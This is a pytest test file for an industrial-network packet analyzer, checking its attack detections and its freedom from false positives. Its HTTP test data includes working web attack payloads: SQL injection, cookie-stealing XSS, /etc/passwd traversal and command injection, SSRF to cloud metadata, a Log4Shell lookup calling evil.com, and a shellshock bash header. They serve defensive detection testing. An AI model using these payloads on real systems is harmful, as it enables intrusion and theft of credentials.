"""End-to-end detection behaviour: true positives on attacks, no false positives on normal traffic."""
import struct

import pytest

from ot_pcap_analyzer.analyzer import EnhancedThreatDetector
from ot_pcap_analyzer.parsers import ProtocolParser
from ot_pcap_analyzer.ot_malware_signatures import OTMalwareDetector
import pcap_factory as pf


def types(analyzer):
    return {a.anomaly_type for a in analyzer.anomalies}


def test_benign_capture_has_no_alerts(analyzed):
    a = analyzed["benign"]
    assert a.protocol_counts["MODBUS_TCP"] == 240
    assert a.anomalies == [], [(x.anomaly_type, x.description) for x in a.anomalies]


def test_all_ot_protocols_are_decoded(analyzed):
    counts = analyzed["ot_protocols"].protocol_counts
    for proto in ("MODBUS_TCP", "S7COMM", "DNP3", "ENIP", "IEC_104", "OPC_UA", "MQTT", "BACNET"):
        assert counts[proto] > 0, proto


EXPECTED_ATTACK_TYPES = {
    # IT layer
    "IT_PORT_SCAN_FAST", "IT_BRUTE_FORCE", "IT_LATERAL_MOVEMENT_SMB", "C2_BEACON_REGULAR",
    "DNS_TUNNEL_LONG_QUERY", "DNS_TUNNEL_ENTROPY", "ARP_SPOOFING_DETECTED",
    "POST_EXPLOIT_SHELL_SESSION",
    # Web
    "HTTP_SQL_INJECTION", "HTTP_PATH_TRAVERSAL", "HTTP_XSS_ATTACK", "HTTP_SUSPICIOUS_USER_AGENT",
    "HTTP_DIRECTORY_BRUTEFORCE",
    # OT layer
    "RAPID_WRITE_SEQUENCE", "OT_SETPOINT_MANIPULATION", "OT_FIRMWARE_MANIPULATION", "OT_REPLAY_ATTACK",
    "OT_MALWARE_PIPEDREAM",
}


def test_attack_capture_detections(analyzed):
    missing = EXPECTED_ATTACK_TYPES - types(analyzed["attacks"])
    assert not missing, f"missing detections: {sorted(missing)}"


def test_attack_capture_correlation(analyzed):
    a = analyzed["attacks"]
    assert len(a.attack_chains) >= 1
    assert len(a.storylines) >= 1
    assert any(c.overall_severity == "CRITICAL" for c in a.attack_chains)


def test_dnp3_attack_commands_are_parsed(analyzed):
    a = analyzed["attacks"]
    assert a.protocol_counts["DNP3"] == 4


def test_edge_cases_do_not_crash(analyzed):
    a = analyzed["edge_cases"]
    assert a.packets_parsed == a.frames_total
    # VLAN-tagged and IPv6 Modbus are still decoded
    assert a.protocol_counts["MODBUS_TCP"] == 2


def test_duplicate_alerts_are_merged(analyzed):
    a = analyzed["attacks"]
    keys = [(x.anomaly_type, x.src_ip, x.dst_ip) for x in a.anomalies]
    brute = [x for x in a.anomalies if x.anomaly_type == "IT_BRUTE_FORCE"]
    assert len(brute) == 1 and brute[0].evidence.get("occurrences", 1) > 1
    dns = [x for x in a.anomalies if x.anomaly_type == "DNS_TUNNEL_ENTROPY"]
    assert len(dns) == 1
    assert len(keys) == len(a.anomalies)


def test_anomalies_contribute_mitre_techniques(analyzed):
    a = analyzed["attacks"]
    assert len(a.mitre_techniques) > 5


def test_analyzer_runs_are_independent(captures, analyze):
    first = analyze(captures["benign"])
    analyze(captures["attacks"])
    again = analyze(captures["benign"])
    assert len(first.anomalies) == len(again.anomalies) == 0
    assert [e.time_since_last_packet for e in first.ot_events[:20]] == \
           [e.time_since_last_packet for e in again.ot_events[:20]]


# ------------------------------------------------------------------ HTTP rule engine
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
BENIGN_HTTP = [
    f"GET /index.html HTTP/1.1\r\nHost: hmi.local\r\nUser-Agent: {UA}\r\nCookie: s=1; t=dark\r\n\r\n",
    f"GET /api/v1/tags?page=2&limit=50&sort=name HTTP/1.1\r\nHost: scada\r\nUser-Agent: {UA}\r\nReferer: http://scada/dashboard\r\n\r\n",
    f"GET /static/app.min.js?v=3.2.1 HTTP/1.1\r\nHost: hmi\r\nUser-Agent: {UA}\r\nAccept: */*\r\n\r\n",
    f"GET /Default.aspx?tab=overview HTTP/1.1\r\nHost: portal\r\nUser-Agent: {UA}\r\n\r\n",
    f"GET /reports/daily.jsp?date=2026-01-01 HTTP/1.1\r\nHost: mes\r\nUser-Agent: {UA}\r\n\r\n",
    f"GET /index.php?page=home&id=12 HTTP/1.1\r\nHost: intranet\r\nUser-Agent: {UA}\r\n\r\n",
    f"GET /weather?location=Berlin HTTP/1.1\r\nHost: intranet\r\nUser-Agent: {UA}\r\n\r\n",
    f"POST /api/v1/setpoints HTTP/1.1\r\nHost: scada\r\nUser-Agent: {UA}\r\nContent-Type: application/json\r\nContent-Length: 45\r\n\r\n{{\"tag\": \"TIC-101.SP\", \"value\": 72.5, \"unit\": \"C\"}}",
    f"POST /upload HTTP/1.1\r\nHost: hmi\r\nUser-Agent: {UA}\r\nContent-Type: multipart/form-data; boundary=XyZ\r\nContent-Length: 120\r\n\r\n"
    "--XyZ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"trend.png\"\r\nContent-Type: image/png\r\n\r\nPNGDATA\r\n--XyZ--\r\n",
]

MALICIOUS_HTTP = {
    "HTTP_SQL_INJECTION": "GET /item.php?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--%20 HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_XSS_ATTACK": "GET /s?q=<script>alert(document.cookie)</script> HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_PATH_TRAVERSAL": "GET /download?f=../../../../etc/passwd HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_COMMAND_INJECTION": "GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_SSRF_ATTACK": "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_CRLF_INJECTION": "GET /redir?u=x%0d%0aSet-Cookie:%20a=b HTTP/1.1\r\nHost: w\r\n\r\n",
    "HTTP_TEMPLATE_INJECTION": "GET / HTTP/1.1\r\nHost: w\r\nUser-Agent: ${jndi:ldap://evil.com/a}\r\n\r\n",
    "HTTP_SUSPICIOUS_USER_AGENT": "GET / HTTP/1.1\r\nHost: w\r\nUser-Agent: sqlmap/1.7.2#stable\r\n\r\n",
}


def _http(raw):
    td = EnhancedThreatDetector()
    h = ProtocolParser.parse_http_request(raw.encode(), 1.0, "10.0.0.1", "10.0.0.2", 5555, 80)
    return {a.anomaly_type for a in td.detect_http_attacks(h)}


@pytest.mark.parametrize("raw", BENIGN_HTTP, ids=[r.split("\r")[0][:40] for r in BENIGN_HTTP])
def test_benign_http_requests_raise_nothing(raw):
    assert _http(raw) == set()


@pytest.mark.parametrize("expected,raw", MALICIOUS_HTTP.items(), ids=list(MALICIOUS_HTTP))
def test_malicious_http_requests_detected(expected, raw):
    assert expected in _http(raw)


def test_shellshock_detected():
    assert "HTTP_COMMAND_INJECTION" in _http("GET /cgi-bin/x HTTP/1.1\r\nHost: w\r\nUser-Agent: () { :; }; /bin/bash -c id\r\n\r\n")


# ------------------------------------------------------------------ OT detectors (unit level)
def _evt(fc=6, src="10.0.0.9", sport=50000, ts=1.0, tid=1):
    return ProtocolParser.parse_modbus_tcp(pf.modbus(tid, 1, fc, struct.pack(">HH", 10, 99)), ts, src, "10.0.0.2", sport, 502, 1)


def test_replay_requires_different_flow():
    td = EnhancedThreatDetector()
    assert td.analyze_ot_replay_attack(_evt(ts=1.0)) is None
    assert td.analyze_ot_replay_attack(_evt(ts=1.2)) is None          # TCP retransmission, same flow
    assert td.analyze_ot_replay_attack(_evt(ts=5.0, sport=50001)) is not None  # re-sent on new connection


def test_replay_ignores_identical_polling_reads():
    td = EnhancedThreatDetector()
    for i in range(5):
        assert td.analyze_ot_replay_attack(_evt(fc=3, ts=float(i), sport=50000 + i)) is None


def test_single_modbus_write_is_not_attributed_to_malware():
    det = OTMalwareDetector()
    assert det.analyze_event(_evt(fc=6)) is None


def test_mass_modbus_writes_attributed_to_malware():
    det = OTMalwareDetector()
    results = [det.analyze_event(_evt(fc=6, ts=1.0 + i * 0.05, tid=i)) for i in range(30)]
    hits = [r for r in results if r]
    assert hits and hits[-1].malware_type.value == "PIPEDREAM"
    assert any(m.startswith("behavior:") for m in hits[-1].matched_patterns)


def test_iec104_control_after_startdt_is_not_a_violation():
    td = EnhancedThreatDetector()
    P = ProtocolParser
    start = P.parse_iec104(pf.iec104_u(0x07), 1.0, "10.0.0.1", "10.0.0.2", 50000, 2404, 1)
    cmd = P.parse_iec104(pf.iec104_i(45), 2.0, "10.0.0.1", "10.0.0.2", 50000, 2404, 2)
    assert td.analyze_protocol_state_violation(start) is None
    assert td.analyze_protocol_state_violation(cmd) is None


def test_dnp3_direct_operate_needs_no_select():
    td = EnhancedThreatDetector()
    e = ProtocolParser.parse_dnp3(pf.dnp3(0x05), 1.0, "10.0.0.1", "10.0.0.2", 50000, 20000, 1)
    assert td.analyze_protocol_state_violation(e) is None
    op = ProtocolParser.parse_dnp3(pf.dnp3(0x04), 2.0, "10.0.0.3", "10.0.0.2", 50000, 20000, 2)
    assert td.analyze_protocol_state_violation(op) is not None  # Operate without Select


# ------------------------------------------------------------------ ML (Isolation Forest)
def _ml_events(n=300, outlier=True):
    evts = []
    for i in range(n):
        e = ProtocolParser.parse_modbus_tcp(pf.modbus(i + 1, 1, 3, struct.pack(">HH", 0, 10)), 1000.0 + i,
                                            "10.0.0.1", "10.0.0.2", 50000, 502, i)
        e.time_since_last_packet = 1.0
        evts.append(e)
    for i in range(30):  # a rare-but-repeated operation (like STARTDT): must not be flagged
        e = ProtocolParser.parse_iec104(pf.iec104_u(0x07), 2000.0 + i, "10.0.0.1", "10.0.0.3", 50000, 2404, i)
        evts.append(e)
    if outlier:
        e = ProtocolParser.parse_modbus_tcp(pf.modbus(9999, 1, 3, struct.pack(">HH", 0, 10)), 5000.0,
                                            "10.0.0.66", "10.0.0.2", 50000, 502, 0)
        e.time_since_last_packet = 3000.0
        e.payload_entropy = 7.9
        e.data_count = 125
        evts.append(e)
    return evts


def test_ml_flags_only_outliers_within_their_operation_group():
    pytest.importorskip("sklearn")
    td = EnhancedThreatDetector()
    events = _ml_events()
    td.train_ml_model(events)
    hits = td.detect_ml_anomalies(events)
    assert [e.src_ip for e, _ in hits] == ["10.0.0.66"]
    assert hits[0][1].severity == "LOW"


def test_ml_no_alerts_on_regular_traffic():
    pytest.importorskip("sklearn")
    td = EnhancedThreatDetector()
    events = _ml_events(outlier=False)
    td.train_ml_model(events)
    assert td.detect_ml_anomalies(events) == []


def test_long_sessions_are_not_scans_or_beacons(tmp_path, analyze):
    """One SSH session, steady polling on one connection, and a web server
    answering many client ports must not look like attacks."""
    b = pf._Builder()
    # admin SSH session: handshake then 200 packets each way
    b.tcp(pf.HMI, pf.WEB, 52222, 22, flags="S")
    b.tcp(pf.WEB, pf.HMI, 22, 52222, flags="SA")
    for i in range(200):
        b.tcp(pf.HMI, pf.WEB, 52222, 22, b"x" * 48, dt=0.2)
        b.tcp(pf.WEB, pf.HMI, 22, 52222, b"y" * 48, dt=0.01)
    # 10 minutes of 1 s Modbus polling on a single connection
    b.tcp(pf.HMI, pf.PLC, 50300, 502, flags="S")
    for i in range(600):
        b.tcp(pf.HMI, pf.PLC, 50300, 502, pf.modbus(i + 1, 1, 3, struct.pack(">HH", 0, 10)), dt=1.0)
    # web server answering 60 client connections from a browser
    for i in range(60):
        b.tcp(pf.HMI, pf.WEB, 56000 + i, 80, flags="S", dt=0.01)
        b.tcp(pf.WEB, pf.HMI, 80, 56000 + i, flags="SA", dt=0.001)
    a = analyze(str(b.write(tmp_path / "sessions.pcap")))
    assert [x.anomaly_type for x in a.anomalies] == []
